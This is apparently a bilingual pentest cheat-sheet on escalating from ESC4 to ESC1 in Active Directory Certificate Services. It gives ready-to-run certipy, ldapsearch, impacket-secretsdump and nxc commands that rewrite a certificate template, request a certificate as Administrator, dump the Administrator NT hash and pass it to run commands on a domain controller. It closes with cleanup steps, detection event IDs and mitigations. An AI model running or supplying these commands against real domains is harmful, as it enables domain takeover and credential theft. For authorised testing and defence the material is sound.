---
title: AD CS — ESC4 to ESC1 (take over a template, request as Administrator)
tags: [windows, adcs, esc4, esc1, privesc, kerberos]
---

# AD CS: from ESC4 to ESC1

**English** | [🇪🇸 Español](adcs-esc4-esc1.md)

## 1. The idea

**ESC4** means write access over a template object (`GenericAll`, `WriteDACL`, `WriteProperty`). That lets you turn any template into an **ESC1** template: the requester chooses `subject`/SAN and the certificate is issued in `Administrator`'s name. The certificate works for PKINIT and yields Administrator's hash.

## 2. Check the permission

```bash
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -vulnerable -stdout
```

On the template:

```text
[!] ESC4 : User has dangerous permissions on the template
```

Its permissions list write ACEs for your user or for a group you belong to (sometimes `S-1-5-11`, "Authenticated Users").

## 3. Turn the template into ESC1

Save the object before touching it, so you can restore it:

```bash
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<password>' \
  -b 'CN=<TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  > template-backup.ldif
```

With `certipy`:

```bash
certipy template -u '<user>@<domain>' -p '<password>' -template '<TEMPLATE>' -write-default-configuration -dc-ip <DC_IP>
```

It sets `msPKI-Certificate-Name-Flag` to `ENROLLEE_SUPPLIES_SUBJECT`, drops manager approval and adds the Client Authentication EKU. By hand, the three changes are:

- `msPKI-Certificate-Name-Flag = 1` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Remove `PEND_ALL_REQUESTS` from `msPKI-Enrollment-Flag`.
- Add `1.3.6.1.5.5.7.3.2` (Client Authentication) to `pKIExtendedKeyUsage`.

And a low-privilege principal must be able to enrol: an `Enroll` ACE for `S-1-5-11` or for your group.

## 4. Requesting the certificate as Administrator

```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>'   -upn 'administrator@<domain>' -sid 'S-1-5-21-<domain>-500' -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

`-sid` is not mandatory: it is used when the `-upn` **does not resolve** to the target object (account without a UPN, another forest, or an invented UPN) and the SID carried by the certificate must be forced. If `administrator@<domain>` exists in the domain, Certipy resolves the SID over LDAP and the certificate is already Administrator's; `-500` pins the real Administrator RID.

With the hash or the `ccache`:

```bash
impacket-secretsdump -just-dc-user Administrator '<domain>/<user>@<DC>' -hashes ':<NT_HASH>'
nxc smb <DC> -u Administrator -H '<NT_HASH>' -x 'whoami'
```

## 5. Typical errors

- **`Certificate template not found`** → the name is not the `CN`; `certipy find` prints the `Template Name`.
- **`The request is not supported`** → the EKU or flag did not stick: re-read the object.
- **`KDC_ERR_CLIENT_NOT_TRUSTED`** → CA not published in `NTAuthCertificates`.
- **`KRB_AP_ERR_SKEW`** → clock; see [clock and Kerberos](../general/kerberos-clock.en.md).
- **Certificate issued but `auth` fails with `invalid signature`** → the PFX lacks the key or was issued by another CA.

## 6. Cleanup

Restore `msPKI-Certificate-Name-Flag`, `msPKI-Enrollment-Flag`, `pKIExtendedKeyUsage` and the original ACEs from `template-backup.ldif`. Certificates already issued stay valid until they expire: revoke them.

## 7. Detection and mitigation

- **4899** (template changed) and **5136** on `CN=Certificate Templates`.
- **4886/4887** where the requester never used the template and `Subject` differs from `RequesterName`.
- Review dangerous ACEs on templates (`WriteDACL`, `WriteProperty`, `GenericAll`) granted to broad groups.
- Remove `Enroll` for `Authenticated Users` on templates with `ENROLLEE_SUPPLIES_SUBJECT`; require approval on sensitive ones.
- Audit `NTAuthCertificates` and the CA's ACLs.

MITRE: T1649, T1558, T1098, T1078.
